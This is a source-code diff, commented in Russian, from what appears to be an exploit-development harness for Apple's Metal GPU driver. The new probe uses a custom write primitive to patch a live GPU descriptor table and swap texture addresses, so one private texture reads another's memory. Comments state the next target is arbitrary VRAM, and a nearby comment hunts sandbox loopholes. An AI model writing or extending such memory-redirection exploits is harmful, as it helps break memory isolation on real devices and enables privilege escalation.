@@ -45239,6 +45239,177 @@ static void p_bq95(void) {
     fsync(fileno(stderr));
 }
 
+// p_bq96 — v256: VA-редирект текстуры через ЖИВУЮ таблицу дескрипторов
+// 0x100_00018000 (§247). 4 private-текстуры с маркерным контентом → находим
+// их записи в таблице по [tex gpuAddress] (упаковка {u32 off, u16 space,
+// u16 flags}) → swap VA-полей tex0/tex1 → copy tex0→буфер: маркер 0x51
+// = таблица управляет реальной GPU-адресацией (легит-путь редиректа, без
+// MT-PATCH) → потом произвольный VRAM VA как цель. Restore исходной страницы.
+static void p_bq96(void) {
+    LOG("[bq96] v256: VA-редирект через живую таблицу 0x100_00018000 (§247)");
+    fsync(fileno(stderr));
+    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+    if (!dev) { LOG("[bq96] no MTLDevice"); return; }
+    id<MTLCommandQueue> mq = [dev newCommandQueue];
+    if (!mq) { LOG("[bq96] no queue"); return; }
+    long k41 = 0, knz = 0;
+    if (bq92_probe(mq, dev, 2, 0, NULL, 0, &k41, &knz) < 0 || !knz) {
+        LOG("[bq96] K0 CONTROL FAILED");
+        return;
+    }
+    LOG("[bq96] K0 OK");
+    fsync(fileno(stderr));
+
+    const uint64_t TAB = 0x10000018000ULL;
+    uint8_t *pg0 = must_map(0x1000);     // до текстур
+    uint8_t *pg1 = must_map(0x1000);     // после текстур (pristine)
+    uint8_t *pgW = must_map(0x1000);     // патченная
+    long cnz = 0, c41 = 0;
+    bq92_probe(mq, dev, 0, TAB, pg0, 0x1000, &c41, &cnz);
+    LOG("[bq96] snap0: nz %ld", cnz);
+
+    // 4 private-текстуры, каждая со своим маркером 0x50+i
+    MTLTextureDescriptor *td = [MTLTextureDescriptor
+        texture2DDescriptorWithPixelFormat:MTLPixelFormatRGBA8Unorm
+        width:256 height:256 mipmapped:NO];
+    td.storageMode = MTLStorageModePrivate;
+    td.usage = MTLTextureUsageShaderRead | MTLTextureUsageShaderWrite;
+    id<MTLTexture> tex[4] = {nil, nil, nil, nil};
+    id<MTLBuffer> mb = [dev newBufferWithLength:0x40000 options:MTLResourceStorageModeShared];
+    if (!mb) { LOG("[bq96] no mb"); return; }
+    for (int i = 0; i < 4; i++) {
+        tex[i] = [dev newTextureWithDescriptor:td];
+        if (!tex[i]) { LOG("[bq96] tex%d fail", i); return; }
+        memset([mb contents], 0x50 + i, 0x40000);
+        id<MTLCommandBuffer> cb = [mq commandBuffer];
+        id<MTLBlitCommandEncoder> en = [cb blitCommandEncoder];
+        [en copyFromBuffer:mb sourceOffset:0 sourceBytesPerRow:0x400
+             sourceBytesPerImage:0x40000 sourceSize:MTLSizeMake(256, 256, 1)
+             toTexture:tex[i] destinationSlice:0 destinationLevel:0
+             destinationOrigin:MTLOriginMake(0, 0, 0)];
+        [en endEncoding];
+        [cb commit];
+        [cb waitUntilCompleted];
+        LOG("[bq96] tex%d: fill %#02x status %ld", i, 0x50 + i, (long)[cb status]);
+        fsync(fileno(stderr));
+    }
+
+    bq92_probe(mq, dev, 0, TAB, pg1, 0x1000, &c41, &cnz);
+    LOG("[bq96] snap1: nz %ld (pristine для restore)", cnz);
+    long nnew = 0;
+    for (int q = 0; q < 0x200; q++) {
+        if (*(uint64_t *)(pg0 + q * 8) != *(uint64_t *)(pg1 + q * 8)) {
+            LOG("[bq96] new[%ld] @+%#x: %#llx -> %#llx", nnew, q * 8,
+                *(uint64_t *)(pg0 + q * 8), *(uint64_t *)(pg1 + q * 8));
+            nnew++;
+        }
+    }
+    if (!nnew) { LOG("[bq96] новых записей НЕТ — таблица не отреагировала?"); }
+    hexdump("[bq96] snap1-head", pg1, 0x100);
+
+    // === собрать НОВЫЕ va-like записи из diff (space 0x10, off>0x1000) ===
+    // (MTLTexture.gpuAddress в этом SDK недоступен — VA берём из самой таблицы;
+    //  порядок создания ≈ ascending VA, §247)
+    uint64_t newva[8]; long newoff[8]; int nva = 0;
+    for (int q = 0; q < 0x200 && nva < 8; q++) {
+        uint64_t v = *(uint64_t *)(pg1 + q * 8);
+        if (v != *(uint64_t *)(pg0 + q * 8) &&
+            ((v >> 32) & 0xFFFFull) == 0x0010ull &&
+            (v & 0xFFFFFFFFull) > 0x1000ull) {
+            newva[nva] = v;
+            newoff[nva] = q * 8;
+            nva++;
+        }
+    }
+    // дедуп VA-значений (таблица держит каждую запись ДВАЖДЫ: основной блок
+    // +0x20.. и зеркало +0x220.. — v1-свапнул две копии одного VA = no-op!)
+    uint64_t dva[8]; int nd = 0;
+    for (int a = 0; a < nva; a++) {
+        int dup = 0;
+        for (int b = 0; b < nd; b++) if (dva[b] == newva[a]) dup = 1;
+        if (!dup) dva[nd++] = newva[a];
+    }
+    for (int a = 0; a < nd; a++)
+        for (int b = a + 1; b < nd; b++)
+            if ((dva[b] & 0xFFFFFFFFull) < (dva[a] & 0xFFFFFFFFull)) {
+                uint64_t tv = dva[b]; dva[b] = dva[a]; dva[a] = tv;
+            }
+    LOG("[bq96] va-записей новых: %d, уникальных VA: %d", nva, nd);
+    for (int a = 0; a < nd; a++)
+        LOG("[bq96]   uva[%d] = %#llx (0x10_%llx)", a, dva[a], dva[a] & 0xFFFFFFFFull);
+    if (nd < 2) {
+        LOG("[bq96] <2 уникальных VA — выходим (restore не нужен)");
+        return;
+    }
+
+    // === swap ВСЕХ вхождений va0 <-> va1 (обе копии таблицы) ===
+    memcpy(pgW, pg1, 0x1000);
+    uint64_t va0 = dva[0], va1 = dva[1];
+    long nsw = 0;
+    for (long off = 0; off + 8 <= 0x1000; off += 8) {
+        uint64_t v = *(uint64_t *)(pgW + off);
+        if (v == va0) { *(uint64_t *)(pgW + off) = va1; nsw++; }
+        else if (v == va1) { *(uint64_t *)(pgW + off) = va0; nsw++; }
+    }
+    long ws = bq93_write_custom(mq, dev, TAB, pgW);
+    LOG("[bq96] SWAP-ALL: %#llx <-> %#llx, заменено %ld u64 | write status %ld",
+        va0, va1, nsw, ws);
+    fsync(fileno(stderr));
+    usleep(200000);
+
+    // === тест: copy tex0 → буфер: чей маркер? ===
+    memset([mb contents], 0, 0x40000);
+    {
+        id<MTLCommandBuffer> cb = [mq commandBuffer];
+        id<MTLBlitCommandEncoder> en = [cb blitCommandEncoder];
+        [en copyFromTexture:tex[0] sourceSlice:0 sourceLevel:0
+             sourceOrigin:MTLOriginMake(0, 0, 0)
+             sourceSize:MTLSizeMake(256, 256, 1) toBuffer:mb
+             destinationOffset:0 destinationBytesPerRow:0x400
+             destinationBytesPerImage:0x40000];
+        [en endEncoding];
+        [cb commit];
+        [cb waitUntilCompleted];
+        LOG("[bq96] tex0 readback: status %ld error %s", (long)[cb status],
+            [cb error] ? [[NSString stringWithFormat:@"%@", [cb error]] UTF8String] : "none");
+    }
+    long cnt[4] = {0, 0, 0, 0};
+    for (long i = 0; i < 0x40000; i += 0x40)
+        for (int m = 0; m < 4; m++)
+            if (((uint8_t *)[mb contents])[i] == 0x50 + m) cnt[m]++;
+    LOG("[bq96] tex0 содержимое: 50:%ld 51:%ld 52:%ld 53:%ld — %s",
+        cnt[0], cnt[1], cnt[2], cnt[3],
+        cnt[1] > cnt[0] ? "*** РЕДИРЕКТ РАБОТАЕТ: tex0 читает память tex1 (таблица = истина!) ***"
+                        : cnt[0] ? "(нет редиректа — ivar/кэш управляет, таблица — зеркало)"
+                                : "(пусто — copy упал?)");
+    fsync(fileno(stderr));
+
+    // === restore ===
+    long rs = bq93_write_custom(mq, dev, TAB, pg1);
+    LOG("[bq96] RESTORE pristine: status %ld", rs);
+    usleep(200000);
+    memset([mb contents], 0, 0x40000);
+    {
+        id<MTLCommandBuffer> cb = [mq commandBuffer];
+        id<MTLBlitCommandEncoder> en = [cb blitCommandEncoder];
+        [en copyFromTexture:tex[0] sourceSlice:0 sourceLevel:0
+             sourceOrigin:MTLOriginMake(0, 0, 0)
+             sourceSize:MTLSizeMake(256, 256, 1) toBuffer:mb
+             destinationOffset:0 destinationBytesPerRow:0x400
+             destinationBytesPerImage:0x40000];
+        [en endEncoding];
+        [cb commit];
+        [cb waitUntilCompleted];
+    }
+    long c0 = 0;
+    for (long i = 0; i < 0x40000; i += 0x40)
+        if (((uint8_t *)[mb contents])[i] == 0x50) c0++;
+    LOG("[bq96] после restore tex0 = 0x50: %ld %s", c0,
+        c0 ? "(таблица восстановлена, всё как было)" : "*** ВОССТАНОВЛЕНИЕ НЕ ПОДТВЕРЖДЕНО ***");
+    LOG("[bq96] ИТОГ: редирект-тест завершен (живо? = нет паники)");
+    fsync(fileno(stderr));
+}
+
 // p_bq87 — v246: SANDBOX-ЛАЗЕЙКИ — что 27.2 ЗАКРЫЛ, а b4 ещё открыт?
 // security_sandbox кекст: +133 правил в 27.2. Каждое новое правило =
 // что-то было РАЗРЕШЕНО в 27.0 (наш b4) и ЗАПРЕЩЕНО в 27.2.
@@ -53848,6 +54019,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ93")) { p_bq93(); LOG("[probe13] bq93-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ94")) { p_bq94(); LOG("[probe13] bq94-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ95")) { p_bq95(); LOG("[probe13] bq95-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ96")) { p_bq96(); LOG("[probe13] bq96-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
